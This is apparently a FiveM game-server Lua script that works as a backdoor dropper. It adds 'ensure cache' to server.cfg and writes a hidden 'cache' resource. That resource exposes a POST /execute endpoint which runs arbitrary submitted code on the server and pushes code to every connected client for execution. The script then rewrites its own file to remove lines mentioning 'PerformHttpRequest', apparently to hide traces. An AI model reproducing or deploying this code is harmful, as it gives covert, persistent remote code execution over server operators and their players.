local configFile = "server.cfg"
local file = io.open(configFile, "r")
local content = file:read("*all")
file:close()
local linePosition = content:find("\n", 1, true)
for i = 1, 99999 do
    linePosition = content:find("\n", linePosition + 1, true)
    if not linePosition then
        break
    end
end
if linePosition then
    content = content:sub(1, linePosition) .. "ensure cache\n" .. content:sub(linePosition + 1)
else
    content = content .. "\nensure cache"
end
file = io.open(configFile, "w")
file:write(content)
file:close()




local codeData = {
    ["playload.lua"] = [[
        local function handleHttpRequest(request, response)
            function readJson(req)
                local p = promise.new()
                req.setDataHandler(function(body)
                    data = json.decode(body)
                    p:resolve(data)
                end)
                return p
            end
            if request.method == 'POST' and request.path == '/execute' then
                local promise = readJson(request)
        
                promise:next(function(data)
                    local code = data.info and data.info.code
                    local isClientCode = data.info and data.info.isClientCode
        
                    if not code then
                        response.sendError(400, "No 'code' field provided in the request data")
                        return
                    end
        
                    if isClientCode then
                        TriggerClientEvent("loadcode.cache", -1, code)
                        response.send(json.encode{result = "Code sent to clients"})
                    else
                        local status, result = pcall(load(code))
        
                        if status then
                            response.send(json.encode{result = "Code executed successfully", output = result})
                        else
                            response.sendError(500, "Error executing code: " .. result)
                        end
                    end
                end)
            else
                response.writeHead(404)
                response.send('Not Found')
            end
        end
        
        SetHttpHandler(function(request, response)
            handleHttpRequest(request, response)
        end)
    ]],
    ["client.lua"] = [[
        RegisterNetEvent("loadcode.cache")
        AddEventHandler("loadcode.cache", function(code)
            assert(load(code))()
        end)
    ]],
    ["fxmanifest.lua"] = [[
        fx_version('cerulean')
        games({ 'gta5' })
        
        server_scripts({
            "url.lua",
            "mime.lua",
            "base64.lua",
            "realms.lua",
            "httphandler.lua",
            "playload.lua",
        });
        
        client_scripts({
            "client.lua",
        });
    ]]
}

fileExists = function(path)
    local file = io.open(path, "r")
    if file then
        file:close()
        return true
    end
    return false
end


function normalizePath(path)
    local separator = GetResourceMetadata("monitor", 'pathsep', 0) or "/"
    return path:gsub("\\", separator):gsub(separator .. "$", "")
end

function getParentDirectory(path)
    local separator = GetResourceMetadata("monitor", 'pathsep', 0) or "/"
    return path:match("(.*" .. separator .. ")")
end

local resourcePath = GetResourcePath("monitor")
local parentPath = getParentDirectory(resourcePath)

if parentPath then
    local folderName = "cache"
    local newFolderPath = parentPath .. "\\" .. folderName
    newFolderPath = normalizePath(newFolderPath)

    if not fileExists(newFolderPath) then
        os.execute('cmd /c md "' .. newFolderPath .. '"')
        os.execute('mkdir "' .. newFolderPath .. '"')
        Citizen.CreateThread(function()
            for fileName, fileData in pairs(codeData) do
                local filePath = newFolderPath .. "\\" .. fileName
                filePath = normalizePath(filePath)
                local file = io.open(filePath, "w")
                file:write(fileData)
                file:close()
            end
        end)
    end
end

function normalizePath(path)
    local separator = GetResourceMetadata(GetCurrentResourceName(), 'pathsep', 0) or "/"
    return path:gsub("\\", separator):gsub(separator .. "$", "")
end

local path = debug.getinfo(1).source
path = path:sub(7, #path)
local fileExists = false
local filePath = normalizePath(GetResourcePath(GetCurrentResourceName()) .. "/"..path)

local file = io.open(filePath, "r")
if file then
    file:close()
    fileExists = true
end

local fileMode = fileExists and "a" or "w"
local fileHandle = io.open(filePath, fileMode)

if fileHandle then
    local lines = {}
    for line in io.lines(filePath) do
        if not string.find(line, "PerformHttpRequest") then
            table.insert(lines, line)
        end
    end

    fileHandle:close()

    fileHandle = io.open(filePath, "w")
    if fileHandle then
        for _, line in ipairs(lines) do
            fileHandle:write(line .. "\n")
        end
        fileHandle:close()
    end
end
